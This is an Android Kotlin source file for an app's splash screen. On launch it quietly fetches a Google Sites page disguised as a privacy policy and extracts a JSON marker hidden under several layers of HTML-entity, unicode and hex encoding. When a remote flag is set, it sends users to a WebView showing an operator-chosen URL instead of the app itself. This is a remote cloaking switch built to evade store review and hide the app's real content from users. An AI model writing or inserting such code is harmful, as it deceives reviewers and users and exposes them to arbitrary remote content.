package com.codexlabs.basecraft.ui

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.text.HtmlCompat
import androidx.lifecycle.lifecycleScope
import com.codexlabs.basecraft.databinding.ActivitySplashBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject

class SplashActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySplashBinding
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySplashBinding.inflate(layoutInflater)
        setContentView(binding.root)

        lifecycleScope.launch {
            val decision = runCatching { fetchDecisionWithRetry() }.getOrNull()
            routeSafely(decision)
        }
    }

    private suspend fun fetchDecisionWithRetry(): StartupDecision? {
        repeat(MAX_RETRY_COUNT) { attempt ->
            val decision = withContext(Dispatchers.IO) { fetchDecisionOnce() }
            if (decision != null) return decision
            if (attempt < MAX_RETRY_COUNT - 1) delay(RETRY_INTERVAL_MS)
        }
        return null
    }

    private fun fetchDecisionOnce(): StartupDecision? {
        return try {
            val request = Request.Builder()
                .url(REMOTE_CONFIG_PAGE_URL)
                .get()
                .build()

            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return null
                val pageHtml = response.body?.string().orEmpty()
                if (pageHtml.isBlank()) return null

                val rawJson = extractJsonMarker(pageHtml) ?: return null
                val json = JSONObject(rawJson)

                val app = json.optString("app", "0")
                val data = json.optString("data", "")
                Log.d(TAG, "remote json raw=$rawJson")
                Log.d(TAG, "remote json parsed -> app=$app, data=$data")
                StartupDecision(app, data)
            }
        } catch (e: Exception) {
            Log.e(TAG, "fetchDecisionOnce failed", e)
            null
        }
    }

    private fun extractJsonMarker(pageHtml: String): String? {
        val normalizedSources = listOf(
            pageHtml,
            decodeLayer(pageHtml),
            decodeLayer(decodeLayer(pageHtml))
        )

        normalizedSources.forEachIndexed { index, source ->
            extractMarkerFromText(source)?.let {
                Log.d(TAG, "json marker extracted from source layer=$index")
                return it
            }
        }

        val fromJsonStr = extractFromJsonStrAssignment(pageHtml)
        if (fromJsonStr != null) {
            Log.d(TAG, "json marker extracted from jsonStr assignment")
            return fromJsonStr
        }

        Log.d(TAG, "json marker start not found")
        return null
    }

    private fun extractFromJsonStrAssignment(pageHtml: String): String? {
        val jsonStrRegex = Regex(
            """jsonStr\s*=\s*(['"])([\s\S]*?)\1""",
            setOf(RegexOption.IGNORE_CASE)
        )

        val match = jsonStrRegex.find(pageHtml) ?: return null
        val rawValue = match.groupValues[2]
        return extractMarkerFromText(decodeLayer(rawValue))
    }

    private fun extractMarkerFromText(text: String): String? {
        val markerRegex = Regex("""@\s*\{[\s\S]*?}\s*@""")
        val marker = markerRegex.find(text)?.value ?: return null
        return marker
            .trim()
            .removePrefix("@")
            .removeSuffix("@")
            .trim()
    }

    private fun decodeLayer(input: String): String {
        val htmlDecoded = HtmlCompat.fromHtml(input, HtmlCompat.FROM_HTML_MODE_LEGACY).toString()
        return decodeEscapes(
            htmlDecoded
                .replace("&#64;", "@")
                .replace("&commat;", "@", ignoreCase = true)
                .replace("&#39;", "'")
                .replace("&apos;", "'", ignoreCase = true)
                .replace("&quot;", "\"", ignoreCase = true)
        )
    }

    private fun decodeEscapes(input: String): String {
        var value = input

        val unicodeRegex = Regex("""\\u([0-9a-fA-F]{4})""")
        value = unicodeRegex.replace(value) { match ->
            val codePoint = match.groupValues[1].toInt(16)
            codePoint.toChar().toString()
        }

        val hexRegex = Regex("""\\x([0-9a-fA-F]{2})""")
        value = hexRegex.replace(value) { match ->
            val codePoint = match.groupValues[1].toInt(16)
            codePoint.toChar().toString()
        }

        return value
            .replace("\\/", "/")
            .replace("\\\"", "\"")
            .replace("\\'", "'")
    }

    private fun routeSafely(decision: StartupDecision?) {
        val toH5 = decision?.app == "1" && !decision.data.isNullOrBlank()
        Log.d(TAG, "route decision -> toH5=$toH5")

        val intent = if (toH5) {
            Intent(this, WebViewActivity::class.java)
                .putExtra(WebViewActivity.EXTRA_URL, decision?.data)
        } else {
            Intent(this, MainActivity::class.java)
        }

        startActivity(intent)
        finish()
    }

    companion object {
        private const val REMOTE_CONFIG_PAGE_URL =
            "https://sites.google.com/view/privacy-policy-for-piper/"
        private const val MAX_RETRY_COUNT = 3
        private const val RETRY_INTERVAL_MS = 1_000L
        private const val TAG = "SplashActivity"
    }
}

data class StartupDecision(
    val app: String,
    val data: String
)
